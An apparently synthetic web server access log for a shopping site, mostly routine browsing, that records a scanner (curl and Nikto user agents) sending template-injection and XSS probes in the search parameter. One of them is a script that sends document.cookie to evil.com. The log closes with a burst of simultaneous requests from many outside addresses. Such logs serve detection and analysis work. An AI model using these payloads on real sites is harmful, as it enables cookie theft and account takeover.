192.168.3.16 - - [14/Mar/2026:20:56:35 +0300] "POST /products?category=electronics HTTP/1.1" 200 7250 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.5.53 - - [14/Mar/2026:21:02:00 +0300] "GET /products HTTP/1.1" 200 19080 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.26 - - [14/Mar/2026:21:02:01 +0300] "GET /api/items?page=1 HTTP/1.1" 404 4387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.26 - - [14/Mar/2026:21:02:05 +0300] "GET /products?category=electronics HTTP/1.1" 200 12159 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.59 - - [14/Mar/2026:21:02:06 +0300] "GET /contact HTTP/1.1" 200 11727 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.35 - - [14/Mar/2026:21:02:07 +0300] "GET /admin/users HTTP/1.1" 200 3716 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.43 - - [14/Mar/2026:21:02:08 +0300] "GET /api/users HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.5.68 - - [14/Mar/2026:21:02:10 +0300] "GET /blog/post/123 HTTP/1.1" 200 6265 "https://google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.5.48 - - [14/Mar/2026:21:02:13 +0300] "GET /blog/post/456 HTTP/1.1" 200 27482 "https://bing.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.2.37 - - [14/Mar/2026:21:02:15 +0300] "GET /products?category=electronics HTTP/1.1" 404 711 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.51 - - [14/Mar/2026:21:02:17 +0300] "GET /sitemap.xml HTTP/1.1" 200 22199 "https://bing.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.28 - - [14/Mar/2026:21:02:22 +0300] "POST /docs/security/xss-prevention HTTP/1.1" 200 5709 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.49 - - [14/Mar/2026:21:02:24 +0300] "GET /api/users/me HTTP/1.1" 200 2734 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.47 - - [14/Mar/2026:21:02:26 +0300] "GET /index.html HTTP/1.1" 200 1509 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.53 - - [14/Mar/2026:21:02:30 +0300] "GET /docs/sql/select-basics HTTP/1.1" 200 7233 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.58 - - [14/Mar/2026:21:02:35 +0300] "GET /api/users HTTP/1.1" 200 1842 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.10 - - [14/Mar/2026:21:02:39 +0300] "GET /index.html HTTP/1.1" 200 12601 "https://t.co/x" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.40 - - [14/Mar/2026:21:02:40 +0300] "GET /login HTTP/1.1" 200 7623 "https://bing.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.4.52 - - [14/Mar/2026:21:02:45 +0300] "HEAD /settings HTTP/1.1" 404 6354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.13 - - [14/Mar/2026:21:02:45 +0300] "GET /favicon.ico HTTP/1.1" 200 19030 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.3.19 - - [14/Mar/2026:21:02:48 +0300] "GET /api/search?q=script+tag+tutorial HTTP/1.1" 200 4956 "https://google.com/" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.5.53 - - [14/Mar/2026:21:02:52 +0300] "GET /index.html HTTP/1.1" 200 13026 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.5.49 - - [14/Mar/2026:21:02:55 +0300] "GET /blog/post/456 HTTP/1.1" 200 19662 "https://t.co/x" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.63 - - [14/Mar/2026:21:02:57 +0300] "GET /index.html HTTP/1.1" 200 15199 "https://t.co/x" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.4.24 - - [14/Mar/2026:21:02:58 +0300] "GET /api/users/me HTTP/1.1" 404 4684 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.4.30 - - [14/Mar/2026:21:02:58 +0300] "GET /about HTTP/1.1" 200 5492 "https://google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.14 - - [14/Mar/2026:21:02:59 +0300] "GET /products HTTP/1.1" 200 1977 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.48 - - [14/Mar/2026:21:03:04 +0300] "GET /api/users/me HTTP/1.1" 200 2028 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.48 - - [14/Mar/2026:21:03:05 +0300] "GET /help HTTP/1.1" 200 9177 "https://google.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.51 - - [14/Mar/2026:21:03:10 +0300] "GET / HTTP/1.1" 200 5049 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.1.55 - - [14/Mar/2026:21:03:15 +0300] "GET /blog/post/456 HTTP/1.1" 200 23808 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.3.12 - - [14/Mar/2026:21:03:15 +0300] "GET / HTTP/1.1" 200 19900 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.35 - - [14/Mar/2026:21:03:17 +0300] "GET /user/login HTTP/1.1" 200 2234 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:21:03:18 +0300] "GET /search?q={{7*7}} HTTP/1.1" 200 436 "-" "curl/8.5.0"
192.168.2.21 - - [14/Mar/2026:21:03:19 +0300] "GET /api/items?page=1 HTTP/1.1" 404 3417 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.31 - - [14/Mar/2026:21:03:21 +0300] "GET /index.html HTTP/1.1" 301 22010 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.133.12.77 - - [14/Mar/2026:21:03:21 +0300] "GET /search?q=<body onload=alert('xss')> HTTP/1.1" 200 230 "-" "curl/8.5.0"
192.168.5.47 - - [14/Mar/2026:21:03:22 +0300] "GET /blog/post/456 HTTP/1.1" 200 18897 "https://google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.3.22 - - [14/Mar/2026:21:03:23 +0300] "POST /user/login HTTP/1.1" 403 7460 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.133.12.77 - - [14/Mar/2026:21:03:25 +0300] "GET /search?q=<object data='javascript:alert(1)'> HTTP/1.1" 200 1842 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.4.36 - - [14/Mar/2026:21:03:28 +0300] "GET /static/site.css HTTP/1.1" 304 2398 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.43 - - [14/Mar/2026:21:03:30 +0300] "GET /checkout HTTP/1.1" 200 15183 "https://google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
45.133.12.77 - - [14/Mar/2026:21:03:33 +0300] "GET /search?q=<script>fetch('//evil.com/steal?cookie='+document.cookie)</script> HTTP/1.1" 400 1970 "-" "Nikto/2.1.6"
192.168.3.33 - - [14/Mar/2026:21:03:34 +0300] "POST /.well-known/security.txt HTTP/1.1" 200 5945 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.5.13 - - [14/Mar/2026:21:03:36 +0300] "GET / HTTP/1.1" 200 13497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.133.12.77 - - [14/Mar/2026:21:03:36 +0300] "POST /search?q=<body onload=alert('xss')> HTTP/1.1" 200 913 "-" "Nikto/2.1.6"
192.168.3.12 - - [14/Mar/2026:21:03:38 +0300] "GET /index.html HTTP/1.1" 200 4011 "https://bing.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.2.15 - - [14/Mar/2026:21:03:40 +0300] "GET /checkout HTTP/1.1" 200 9850 "https://google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.3.28 - - [14/Mar/2026:21:03:43 +0300] "GET /blog/post/123 HTTP/1.1" 200 21857 "https://t.co/x" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.3.43 - - [14/Mar/2026:21:03:46 +0300] "POST /api/search?q=laptop HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.2.21 - - [14/Mar/2026:21:03:47 +0300] "GET /products HTTP/1.1" 200 14591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.5.42 - - [14/Mar/2026:21:03:50 +0300] "GET /cart HTTP/1.1" 301 606 "https://bing.com/" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.5.53 - - [14/Mar/2026:21:03:54 +0300] "GET /signin HTTP/1.1" 200 1676 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.1.64 - - [14/Mar/2026:21:03:57 +0300] "GET /api/items HTTP/1.1" 200 2407 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.5.47 - - [14/Mar/2026:21:04:02 +0300] "GET /api/users/me HTTP/1.1" 200 3941 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.3.19 - - [14/Mar/2026:21:04:05 +0300] "GET /blog/post/456 HTTP/1.1" 404 7691 "https://t.co/x" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.26 - - [14/Mar/2026:21:04:09 +0300] "GET /api/items HTTP/1.1" 500 11678 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.47 - - [14/Mar/2026:21:04:12 +0300] "GET /api/search?q=laptop HTTP/1.1" 200 8505 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.4.52 - - [14/Mar/2026:21:04:13 +0300] "POST /account/login HTTP/1.1" 401 1073 "https://bing.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.3.66 - - [14/Mar/2026:21:04:13 +0300] "GET /favicon.ico HTTP/1.1" 304 9284 "https://google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.1.50 - - [14/Mar/2026:21:04:17 +0300] "GET / HTTP/1.1" 200 17604 "https://bing.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.4.52 - - [14/Mar/2026:21:04:18 +0300] "GET /products?category=books HTTP/1.1" 200 2999 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.4.30 - - [14/Mar/2026:21:04:20 +0300] "GET /blog/post/123 HTTP/1.1" 200 14066 "https://bing.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.3.31 - - [14/Mar/2026:21:04:24 +0300] "GET /favicon.ico HTTP/1.1" 200 10615 "https://google.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.2.69 - - [14/Mar/2026:21:04:28 +0300] "GET /.well-known/security.txt HTTP/1.1" 301 3057 "https://t.co/x" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.40 - - [14/Mar/2026:21:04:30 +0300] "GET /faq HTTP/1.1" 200 16149 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.5.34 - - [14/Mar/2026:21:04:31 +0300] "POST /docs/sql/select-basics HTTP/1.1" 301 4362 "https://t.co/x" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.5.27 - - [14/Mar/2026:21:04:35 +0300] "GET /search?q=%3C3+sale HTTP/1.1" 200 4139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.49 - - [14/Mar/2026:21:04:37 +0300] "GET /search?q=laptop HTTP/1.1" 200 3646 "https://t.co/x" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.1.51 - - [14/Mar/2026:21:04:40 +0300] "GET /products HTTP/1.1" 200 18257 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.1.58 - - [14/Mar/2026:21:04:43 +0300] "GET /docs HTTP/1.1" 200 2061 "https://t.co/x" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.28 - - [14/Mar/2026:21:04:47 +0300] "GET /sitemap.xml HTTP/1.1" 200 22361 "https://google.com/" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.5.10 - - [14/Mar/2026:21:04:51 +0300] "GET /profile HTTP/1.1" 200 15319 "https://t.co/x" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.4.61 - - [14/Mar/2026:21:04:53 +0300] "GET /api/items?page=2&limit=20 HTTP/1.1" 200 4135 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.2.37 - - [14/Mar/2026:21:04:53 +0300] "GET /api/search HTTP/1.1" 200 1033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.2.69 - - [14/Mar/2026:21:04:56 +0300] "GET /about HTTP/1.1" 200 25319 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.4.36 - - [14/Mar/2026:21:04:58 +0300] "GET /api/users/me HTTP/1.1" 200 9100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.3.59 - - [14/Mar/2026:21:05:03 +0300] "GET /api/items HTTP/1.1" 200 6669 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.32 - - [14/Mar/2026:21:05:07 +0300] "GET /api/search HTTP/1.1" 200 11276 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.4.29 - - [14/Mar/2026:21:05:11 +0300] "GET /docs HTTP/1.1" 200 19922 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.11 - - [14/Mar/2026:21:05:12 +0300] "GET / HTTP/1.1" 200 11966 "https://t.co/x" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.3.66 - - [14/Mar/2026:21:05:14 +0300] "GET /robots.txt HTTP/1.1" 200 9750 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
192.168.3.66 - - [14/Mar/2026:21:05:14 +0300] "GET /sitemap.xml HTTP/1.1" 200 15166 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.5.48 - - [14/Mar/2026:21:05:17 +0300] "GET /search?q=laptop HTTP/1.1" 200 11049 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.5.14 - - [14/Mar/2026:21:05:22 +0300] "GET /api/search HTTP/1.1" 200 5027 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.1.46 - - [14/Mar/2026:21:05:24 +0300] "POST /profile HTTP/1.1" 302 5393 "https://bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.2.69 - - [14/Mar/2026:21:05:26 +0300] "GET /user/login HTTP/1.1" 200 1689 "https://t.co/x" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
192.168.3.19 - - [14/Mar/2026:21:05:28 +0300] "GET /cart HTTP/1.1" 200 9450 "https://bing.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.54 - - [14/Mar/2026:21:05:31 +0300] "GET /api/items?page=1 HTTP/1.1" 200 11816 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.5.42 - - [14/Mar/2026:21:05:36 +0300] "GET /api/items?page=1 HTTP/1.1" 200 10795 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
192.168.4.20 - - [14/Mar/2026:21:05:36 +0300] "GET /server-status HTTP/1.1" 404 1473 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.2.56 - - [14/Mar/2026:21:05:40 +0300] "GET /products?category=books HTTP/1.1" 200 4980 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
92.115.156.229 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items?page=1 HTTP/1.1" 200 1042 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
42.241.157.217 - - [14/Mar/2026:21:05:41 +0300] "GET /api/users HTTP/1.1" 200 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
182.251.187.212 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items?page=1 HTTP/1.1" 200 2333 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
101.219.129.41 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items HTTP/1.1" 504 2342 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
19.97.196.189 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items?page=1 HTTP/1.1" 504 2411 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
45.6.254.248 - - [14/Mar/2026:21:05:41 +0300] "GET / HTTP/1.1" 503 2740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
184.7.153.162 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items?page=1 HTTP/1.1" 200 2750 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
134.156.53.183 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items?page=1 HTTP/1.1" 200 1490 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
109.96.45.248 - - [14/Mar/2026:21:05:41 +0300] "GET /api/users HTTP/1.1" 500 2187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
158.222.233.22 - - [14/Mar/2026:21:05:41 +0300] "GET / HTTP/1.1" 500 2882 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
1.175.43.216 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items HTTP/1.1" 200 496 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
26.223.216.103 - - [14/Mar/2026:21:05:41 +0300] "GET /api/users HTTP/1.1" 200 1001 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
18.166.67.87 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items HTTP/1.1" 200 1758 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
177.203.19.206 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items HTTP/1.1" 429 1273 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
185.10.89.203 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items HTTP/1.1" 504 2602 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
32.78.198.179 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items HTTP/1.1" 429 2514 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
189.233.12.207 - - [14/Mar/2026:21:05:41 +0300] "GET /api/search HTTP/1.1" 200 802 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
183.207.157.193 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items HTTP/1.1" 429 2953 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
12.1.28.61 - - [14/Mar/2026:21:05:41 +0300] "GET /api/search HTTP/1.1" 500 1884 "-" "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0"
14.251.108.92 - - [14/Mar/2026:21:05:41 +0300] "GET /api/users HTTP/1.1" 200 1230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
164.134.160.113 - - [14/Mar/2026:21:05:41 +0300] "GET /api/items HTTP/1.1" 429 2342 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
138.138.160.139 - - [14/Mar/2026:21:05:41 +0300] "GET /api/users HTTP/1.1" 504 1551 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36"
